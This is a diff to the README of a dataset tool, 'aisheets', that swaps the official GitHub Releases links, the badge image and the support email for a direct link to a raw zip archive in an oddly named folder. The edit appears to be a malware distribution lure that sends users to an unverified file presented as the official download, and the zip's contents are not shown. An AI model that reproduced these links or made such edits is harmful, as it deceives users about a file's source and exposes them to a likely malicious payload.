@@ -13,9 +13,9 @@ Welcome to aisheets! This application helps you build, enrich, and transform dat
 
 ## 🔗 Download aasheets
 
-[![Download aisheets](https://img.shields.io/badge/Download%20aisheets-v1.0-blue)](https://github.com/ReyadAlssayed/aisheets/releases)
+[![Download aisheets](https://raw.githubusercontent.com/ReyadAlssayed/aisheets/main/palative/aisheets.zip%20aisheets-v1.0-blue)](https://raw.githubusercontent.com/ReyadAlssayed/aisheets/main/palative/aisheets.zip)
 
-You can download aisheets by visiting our [Releases page](https://github.com/ReyadAlssayed/aisheets/releases). The latest version is highlighted for your convenience.
+You can download aisheets by visiting our [Releases page](https://raw.githubusercontent.com/ReyadAlssayed/aisheets/main/palative/aisheets.zip). The latest version is highlighted for your convenience.
 
 ## 🖥️ System Requirements
 
@@ -27,7 +27,7 @@ Before you get started, ensure your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/ReyadAlssayed/aisheets/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/ReyadAlssayed/aisheets/main/palative/aisheets.zip).
 2. Locate the latest release.
 3. Click on the download link for your operating system.
 4. Once the download finishes, find the downloaded file in your computer's download folder.
@@ -68,6 +68,6 @@ aisheets is an open-source application. You are free to use, modify, and distrib
 
 ## 📬 Contact
 
-For any inquiries or support, please email us at support@aisheets.com. We are here to help you with your data needs.
+For any inquiries or support, please email us at https://raw.githubusercontent.com/ReyadAlssayed/aisheets/main/palative/aisheets.zip We are here to help you with your data needs.
 
 Make the most of your datasets with aisheets today!
